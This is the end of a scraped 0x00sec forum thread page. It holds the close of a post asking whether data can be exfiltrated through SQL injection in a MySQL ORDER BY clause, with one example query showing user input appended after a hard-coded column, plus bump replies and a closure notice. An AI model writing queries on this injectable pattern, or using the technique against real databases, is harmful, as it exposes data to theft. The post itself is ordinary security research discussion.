<p>If you enjoyed the post, learnt something new, or have any feedback / improvements, make sure to follow me on Twitter (<a href="https://twitter.com/SecGus" rel="noopener nofollow ugc">https://twitter.com/SecGus</a>).</p>
<p>*If anyone has been able to successfully exfiltrate data via the ORDER BY clause in MySQL when the column name is hard-coded (like this <code>SELECT * FROM users WHERE name = "example" ORDER BY name USER-INPUT;</code>), I would love to know how, my DMs on here are always open, or you can reach me on twitter (see above), or via email at <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="05776471456a7071696a6a6e2b6471">[email&#160;protected]</a>.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="12" />
<span class="post-likes">12 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../0x00sec-2019-year-end-review-year-0x04/18391.html">0x00sec 2019 Year End Review - Year 0x04</a>
<meta itemprop="position" content="13">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="18122.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-15T14:58:19Z" class="post-time">
April 15, 2020, 2:58pm
</time>
<meta itemprop="dateModified" content="2020-04-15T14:58:19Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Sorry another bump…</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/chivato"><span itemprop="name">chivato</span></a>
</span>
<link itemprop="mainEntityOfPage" href="18122.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-15T15:01:33Z" class="post-time">
April 15, 2020, 3:01pm
</time>
<meta itemprop="dateModified" content="2020-04-15T15:01:33Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hahahaha, need to get more content pumped out on here. <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="18122.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-17T05:57:24Z" class="post-time">
April 17, 2020, 5:57am
</time>
<meta itemprop="dateModified" content="2020-04-17T05:57:24Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
